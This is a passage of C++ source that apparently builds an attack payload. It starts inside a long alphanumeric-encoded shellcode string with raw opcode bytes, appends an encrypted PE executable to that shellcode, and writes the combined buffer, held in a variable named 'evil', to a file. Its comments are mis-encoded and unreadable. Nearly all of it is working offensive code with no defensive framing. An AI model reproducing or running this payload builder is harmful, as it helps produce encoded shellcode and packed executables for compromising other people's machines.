KO2LYVMUU9KNKOKOBSXFMURJKNKOKO2TIVK52KKNKOKOT2O6MURLKNKOKORLIVMURMKNKOKOCUYVK5RNKNKOKO2NO6LEROKNKOKOQQK0OUD0KNKOKOEPZHLCEQUPUPLMK5XLKNKOKOPPKORUJTKOLUILKNKOKOK9MUMXKNKOKOLMMUNTKNKOKOPPKOT5JTKOLUYLKNKOKOK9K5NPKNKOKOLMMUNDKNKOKO0PKORUKDKOLUYLKNKOKOK9PEM8LMMUJ0KNKOKO60KOSEKDKOLUILKNKOKOLIMUE0KNKOKOLMLESLKNKOKOPPKO2UL4KOLUYLKNKOKOMYMUXXKNKOKOLMMUSXKNKOKOV0KOT5L4KOLUYLKNKOKOMY0EJLRH5T31EPEPLMLEM4KNKOKOF03Z5PKOJ5NPKNKOKOLMMUM4KNKOKOPPKOV5ZLMYLEOPKNKOKOLKK5OPKNKOKOTOONMTUUJCKNKOKOLCZX1LSDTOLKLEI0KNKOKO78MYMUY0KNKOKOJKYNLKMUOPKNKOKOMPND35ZDKNKOKO5PLMPEL80PLMK5ZDKNKOKOPPKOF5M82J30BJ7PBJ5S2JUPRJ5Q2HS0UPS0MPLMLEKTKNKOKOPPKOJ5MXKNKOKOLIMULLKNKOKORJ70SXEP4PUPUP3X5PEPTPS0CZUPKOMESPKNKOKOK9MURDKNKOKOSZEPLMMURTKNKOKO0PSXUPC04PS0KONU2DKNKOKOKOX5LLKNKOKOKOLU9HKNKOKOK3OUHHKNKOKO5PLKLECTKNKOKODCMUYXKNKOKOTOOFEPK5IPT4DOLKK59XKNKOKOQPMYMU9XKNKOKOJKYNLKMUIXKNKOKOLKLMSTKNKOKOLMW4C1UQMYMU48KNKOKOLKK5RXKNKOKOKOKPX9P0EPEP5PSTLKUQ2DLKUMVP5P30EPLKQKTLLKQKTTLKEKLK5KLK1STPLIG5L4LKSMZTLK77WLLK645W2X339GMYF5L0LKQEZPLKBZ4XLKT2WP5SD5L4FSXIWKHORTWOLKULLNS31ML4MQGKW7RERT0PD5VNMQCK342R2O3S1Q3EQ5SPLKRUJPLKQNWT33QML4LKD65L332UJTLKXQDOOG4LF3LK5TLNESQUKDMYMUYLKNKOKOU1JKUSQQJKOMO3ACLKTDLN5SQUJPK9LEN8KNKOKOU1ZKS3G1JKOM9SACACCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBBBBBBBBBBBBBBBBBBB01238888ABBAAêÎêêXˇ‡êËˆˇˇˇPYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIH9RaQQW11QOKQapQQQSpP3xYlyBpEPgpGpF1pQKOFsskSilKihLKn88k7uCnl2nDioXcM8xvKOioKOoq8l7pwt7pS0KLJKDa2yLxRWROPoPtpQrJkO03YKSTMYWSRJ32PYnkkK8sNO3EGwIoJGQvoqzkkODO3sJKZMkXyJYoyoYoQz4LryLKs4flNQOHk37tUXwvrxMSo4VpPP4syPO3AêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêS01CKOHURC512L3SC0AABBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCcCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD3…ê±∏êÎ[êã$êâÉÏXÉƒP3¿ê√êËÂˇˇˇêê∏BBBAHã¸GOWØ_u˙êÉ«ˇÁaaaaaaaaaaÎ∫ZZc"
	);
	char e[] = { 0x0d,0x0a,0 }; //’‚2∏ˆ◊÷Ω⁄◊÷∑˚¥Æ–Œ ΩŒﬁ∑®◊È÷Ø◊÷∑˚¥Æµ•∂¿∏¥÷∆
	strcat(szShellCode, e);
	printf("%s\n", szShellCode);//’‚¿Ô»´≤øÕ∂shell◊È÷ØÕÍ≥…
								//∫œ≤¢“ª∏ˆŒƒº˛
	int iLenShellCode = strlen(szShellCode) + 1;
	int iAll = iLenShellCode + finalSize;//shellÕ∑+0+peº”√‹shell ◊‹≥§∂»
	evil = new BYTE[iAll];
	RtlZeroMemory(evil, iAll);
	RtlCopyMemory(evil, szShellCode, iLenShellCode);//∏¥÷∆shellÕ∑
	PBYTE p0 = evil + iLenShellCode;
	RtlCopyMemory(p0, finalShellcode, finalSize);//∏¥÷∆peº”√‹shell
	free(finalShellcode);
	delete[]szShellCode;

	ofstream fout;
	fout.open("a", ios_base::binary | ios::trunc);
	if (!fout.is_open())
	{
		cout << "Error Out Open..." << endl;
		return -1;
	}
	cout << "file size :" << iLenShellCode + finalSize << endl;
	fout.write((char*)evil, iLenShellCode + finalSize);
	fout.close();
	delete[]evil;
	system("pause");
	return 0;
}


